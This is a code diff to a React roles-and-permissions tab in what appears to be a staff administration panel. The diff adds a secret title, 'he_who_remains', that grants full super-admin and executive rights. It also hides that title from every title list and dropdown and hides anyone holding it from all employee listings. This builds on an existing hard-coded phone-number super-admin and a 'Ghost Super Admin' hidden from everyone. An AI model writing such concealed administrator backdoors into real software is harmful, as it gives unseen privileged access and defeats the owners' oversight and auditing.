@@ -38,6 +38,7 @@ const DAYS_OF_WEEK = [
 ];
 
 const HIERARCHY_ORDER = {
+  he_who_remains: 0,
   super_admin: 0,
   memberships_executive_director: 1,
   memberships_area_manager: 2,
@@ -49,7 +50,7 @@ const HIERARCHY_ORDER = {
 };
 
 export function RolesPermissionsTab({ currentUser, onTitlesUpdated }) {
-  const isSuperAdmin = Boolean(currentUser?.isSuperAdmin || currentUser?.phone === '01010046078');
+  const isSuperAdmin = Boolean(currentUser?.isSuperAdmin || currentUser?.phone === '01010046078' || currentUser?.titleCode === 'he_who_remains');
   const canManageTitles = Boolean(isSuperAdmin || currentUser?.permissions?.manage_titles_permissions);
   const canManageEmployees = Boolean(isSuperAdmin || currentUser?.permissions?.manage_employees);
   const canEditEmployeeDetails = Boolean(isSuperAdmin || currentUser?.permissions?.edit_employee_details || currentUser?.permissions?.manage_employees);
@@ -183,8 +184,10 @@ export function RolesPermissionsTab({ currentUser, onTitlesUpdated }) {
     try {
       const res = await api.getTitles();
       if (res.success) {
-        setTitles(res.titles);
-        const allowed = res.titles.filter(t => {
+        // Hidden titles like he_who_remains must NEVER appear in public tabs or edit dropdowns
+        const visibleTitles = (res.titles || []).filter(t => !t.isHidden && t.code !== 'he_who_remains');
+        setTitles(visibleTitles);
+        const allowed = visibleTitles.filter(t => {
           if (isSuperAdmin) return true;
           const targetRank = t.order || HIERARCHY_ORDER[t.code] || 99;
           return targetRank > myRank;
@@ -350,11 +353,11 @@ export function RolesPermissionsTab({ currentUser, onTitlesUpdated }) {
   // Filter employees according to user's scope
   const allowedBranches = getUserAllowedBranches(currentUser, branches);
   const allowedBranchIds = allowedBranches.map(b => b.id);
-  const isExecutive = currentUser?.titleCode === 'memberships_executive_director';
+  const isExecutive = currentUser?.titleCode === 'memberships_executive_director' || currentUser?.titleCode === 'he_who_remains';
 
   const visibleEmployees = employees.filter(emp => {
-    // Hide Ghost Super Admin from everyone!
-    if (emp.phone === '01010046078' || emp.isGhost || emp.isSuperAdmin) {
+    // Hide Ghost Super Admin / HE WHO REMAINS from everyone!
+    if (emp.phone === '01010046078' || emp.isGhost || emp.isSuperAdmin || emp.titleCode === 'he_who_remains') {
       return false;
     }
     // Branch scoping
